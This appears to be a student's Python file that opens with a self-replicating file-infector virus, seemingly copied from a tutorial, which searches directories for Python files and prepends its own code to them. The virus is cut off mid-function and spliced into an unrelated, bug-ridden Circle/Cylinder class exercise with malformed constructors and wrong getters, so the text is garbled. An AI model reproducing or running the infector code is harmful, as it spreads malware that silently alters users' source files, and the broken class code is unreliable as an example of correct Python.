import os, datetime, inspect

DATA_TO_INSERT = "GEEKSFORGEEKS"


# search for target files in path
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:

        # If it is a folder
        if os.path.isdir(path + "/" + filename):
            filestoinfect.extend(search(path + "/" + filename))

            # If it is a python script -> Infect it
        elif filename[-3:] == ".py":

            # default value
            infected = False
            for line in open(path + "/" + filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path + "/" + filename)
    return filestoinfect


# changes to be made in the target file
def infect(filestoinfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i, line in enumerate(virus):
        if i >= 0 and i < 41:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
import math

class circle :
    def _init_(self, radius =1.0):
        self._radius = radius
        self.color = color

    def set_radius(self,radius):
        self._radius = radius

    def get_radius(self,radius):
        return self.radius

    def get_color(self):
        return self.radius

    def set_color(self,color):
        self.color = color

    def __str__(self):
        return f'This is Circle Class Radius: {self.radius} , Color: {self.color}'

    def getArea(self):
        return (math.pi * (self.radius ** 2))


class Cylinder(circle):
    def __init___(self, radius, color, height):
        super.__init__(radius, color)
        self._height = height

    def getHeight(self):
        return (self._height)

    def setHeight(self, height):
        self._height = height

    def __str__(self):
        return f'This is cylinder class Radius: {super.getRadius()}, Color: {super.getColor()} , Height: {self.getHeight()} '


def getVolume(self):
    return (math.pi * (super.getRadius() ** 2) * super.getHeight())
#i kinda stuck on first and i use internet to solved my problem
#for the class i can make it but how to set it up i kinda lost
